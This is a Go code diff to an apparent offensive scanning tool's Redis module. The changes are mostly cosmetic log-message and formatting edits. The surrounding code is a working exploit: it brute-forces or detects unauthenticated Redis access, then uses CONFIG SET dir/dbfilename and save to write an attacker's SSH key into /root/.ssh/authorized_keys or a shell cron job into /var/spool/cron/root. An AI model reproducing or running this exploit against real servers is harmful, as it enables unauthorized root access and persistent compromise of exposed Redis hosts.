@@ -72,11 +72,11 @@ func RedisConn(info *common.HostInfo, pass string) (flag bool, err error) {
 		flag = true
 		dbfilename, dir, err = getconfig(conn)
 		if err != nil {
-			result := fmt.Sprintf("[+] Redis:%s %s", realhost, pass)
+			result := fmt.Sprintf("[+] Redis %s %s", realhost, pass)
 			common.LogSuccess(result)
 			return flag, err
 		} else {
-			result := fmt.Sprintf("[+] Redis:%s %s file:%s/%s", realhost, pass, dir, dbfilename)
+			result := fmt.Sprintf("[+] Redis %s %s file:%s/%s", realhost, pass, dir, dbfilename)
 			common.LogSuccess(result)
 		}
 		err = Expoilt(realhost, conn)
@@ -112,11 +112,11 @@ func RedisUnauth(info *common.HostInfo) (flag bool, err error) {
 		flag = true
 		dbfilename, dir, err = getconfig(conn)
 		if err != nil {
-			result := fmt.Sprintf("[+] Redis:%s unauthorized", realhost)
+			result := fmt.Sprintf("[+] Redis %s unauthorized", realhost)
 			common.LogSuccess(result)
 			return flag, err
 		} else {
-			result := fmt.Sprintf("[+] Redis:%s unauthorized file:%s/%s", realhost, dir, dbfilename)
+			result := fmt.Sprintf("[+] Redis %s unauthorized file:%s/%s", realhost, dir, dbfilename)
 			common.LogSuccess(result)
 		}
 		err = Expoilt(realhost, conn)
@@ -130,7 +130,7 @@ func Expoilt(realhost string, conn net.Conn) error {
 		return err
 	}
 	if flagSsh == true {
-		result := fmt.Sprintf("[+] Redis:%v like can write /root/.ssh/", realhost)
+		result := fmt.Sprintf("[+] Redis %v like can write /root/.ssh/", realhost)
 		common.LogSuccess(result)
 		if common.RedisFile != "" {
 			writeok, text, err := writekey(conn, common.RedisFile)
@@ -139,16 +139,16 @@ func Expoilt(realhost string, conn net.Conn) error {
 				return err
 			}
 			if writeok {
-				result := fmt.Sprintf("[+] %v SSH public key was written successfully", realhost)
+				result := fmt.Sprintf("[+] Redis %v SSH public key was written successfully", realhost)
 				common.LogSuccess(result)
 			} else {
-				fmt.Println("[-] Redis:", realhost, "SSHPUB write failed", text)
+				fmt.Println("[-] Redis ", realhost, "SSHPUB write failed", text)
 			}
 		}
 	}
 
 	if flagCron == true {
-		result := fmt.Sprintf("[+] Redis:%v like can write /var/spool/cron/", realhost)
+		result := fmt.Sprintf("[+] Redis %v like can write /var/spool/cron/", realhost)
 		common.LogSuccess(result)
 		if common.RedisShell != "" {
 			writeok, text, err := writecron(conn, common.RedisShell)
@@ -156,10 +156,10 @@ func Expoilt(realhost string, conn net.Conn) error {
 				return err
 			}
 			if writeok {
-				result := fmt.Sprintf("[+] %v /var/spool/cron/root was written successfully", realhost)
+				result := fmt.Sprintf("[+] Redis %v /var/spool/cron/root was written successfully", realhost)
 				common.LogSuccess(result)
 			} else {
-				fmt.Println("[-] Redis:", realhost, "cron write failed", text)
+				fmt.Println("[-] Redis ", realhost, "cron write failed", text)
 			}
 		}
 	}
@@ -169,7 +169,7 @@ func Expoilt(realhost string, conn net.Conn) error {
 
 func writekey(conn net.Conn, filename string) (flag bool, text string, err error) {
 	flag = false
-	_, err = conn.Write([]byte(fmt.Sprintf("CONFIG SET dir /root/.ssh/\r\n")))
+	_, err = conn.Write([]byte("CONFIG SET dir /root/.ssh/\r\n"))
 	if err != nil {
 		return flag, text, err
 	}
@@ -178,7 +178,7 @@ func writekey(conn net.Conn, filename string) (flag bool, text string, err error
 		return flag, text, err
 	}
 	if strings.Contains(text, "OK") {
-		_, err := conn.Write([]byte(fmt.Sprintf("CONFIG SET dbfilename authorized_keys\r\n")))
+		_, err := conn.Write([]byte("CONFIG SET dbfilename authorized_keys\r\n"))
 		if err != nil {
 			return flag, text, err
 		}
@@ -205,7 +205,7 @@ func writekey(conn net.Conn, filename string) (flag bool, text string, err error
 				return flag, text, err
 			}
 			if strings.Contains(text, "OK") {
-				_, err = conn.Write([]byte(fmt.Sprintf("save\r\n")))
+				_, err = conn.Write([]byte("save\r\n"))
 				if err != nil {
 					return flag, text, err
 				}
@@ -228,7 +228,7 @@ func writekey(conn net.Conn, filename string) (flag bool, text string, err error
 
 func writecron(conn net.Conn, host string) (flag bool, text string, err error) {
 	flag = false
-	_, err = conn.Write([]byte(fmt.Sprintf("CONFIG SET dir /var/spool/cron/\r\n")))
+	_, err = conn.Write([]byte("CONFIG SET dir /var/spool/cron/\r\n"))
 	if err != nil {
 		return flag, text, err
 	}
@@ -237,7 +237,7 @@ func writecron(conn net.Conn, host string) (flag bool, text string, err error) {
 		return flag, text, err
 	}
 	if strings.Contains(text, "OK") {
-		_, err = conn.Write([]byte(fmt.Sprintf("CONFIG SET dbfilename root\r\n")))
+		_, err = conn.Write([]byte("CONFIG SET dbfilename root\r\n"))
 		if err != nil {
 			return flag, text, err
 		}
@@ -260,7 +260,7 @@ func writecron(conn net.Conn, host string) (flag bool, text string, err error) {
 				return flag, text, err
 			}
 			if strings.Contains(text, "OK") {
-				_, err = conn.Write([]byte(fmt.Sprintf("save\r\n")))
+				_, err = conn.Write([]byte("save\r\n"))
 				if err != nil {
 					return flag, text, err
 				}
@@ -315,7 +315,7 @@ func readreply(conn net.Conn) (result string, err error) {
 
 func testwrite(conn net.Conn) (flag bool, flagCron bool, err error) {
 	var text string
-	_, err = conn.Write([]byte(fmt.Sprintf("CONFIG SET dir /root/.ssh/\r\n")))
+	_, err = conn.Write([]byte("CONFIG SET dir /root/.ssh/\r\n"))
 	if err != nil {
 		return flag, flagCron, err
 	}
@@ -326,7 +326,7 @@ func testwrite(conn net.Conn) (flag bool, flagCron bool, err error) {
 	if strings.Contains(text, "OK") {
 		flag = true
 	}
-	_, err = conn.Write([]byte(fmt.Sprintf("CONFIG SET dir /var/spool/cron/\r\n")))
+	_, err = conn.Write([]byte("CONFIG SET dir /var/spool/cron/\r\n"))
 	if err != nil {
 		return flag, flagCron, err
 	}
@@ -341,7 +341,7 @@ func testwrite(conn net.Conn) (flag bool, flagCron bool, err error) {
 }
 
 func getconfig(conn net.Conn) (dbfilename string, dir string, err error) {
-	_, err = conn.Write([]byte(fmt.Sprintf("CONFIG GET dbfilename\r\n")))
+	_, err = conn.Write([]byte("CONFIG GET dbfilename\r\n"))
 	if err != nil {
 		return
 	}
@@ -355,7 +355,7 @@ func getconfig(conn net.Conn) (dbfilename string, dir string, err error) {
 	} else {
 		dbfilename = text1[0]
 	}
-	_, err = conn.Write([]byte(fmt.Sprintf("CONFIG GET dir\r\n")))
+	_, err = conn.Write([]byte("CONFIG GET dir\r\n"))
 	if err != nil {
 		return
 	}
@@ -377,7 +377,7 @@ func recoverdb(dbfilename string, dir string, conn net.Conn) (err error) {
 	if err != nil {
 		return
 	}
-	dbfilename, err = readreply(conn)
+	_, err = readreply(conn)
 	if err != nil {
 		return
 	}
@@ -385,7 +385,7 @@ func recoverdb(dbfilename string, dir string, conn net.Conn) (err error) {
 	if err != nil {
 		return
 	}
-	dir, err = readreply(conn)
+	_, err = readreply(conn)
 	if err != nil {
 		return
 	}
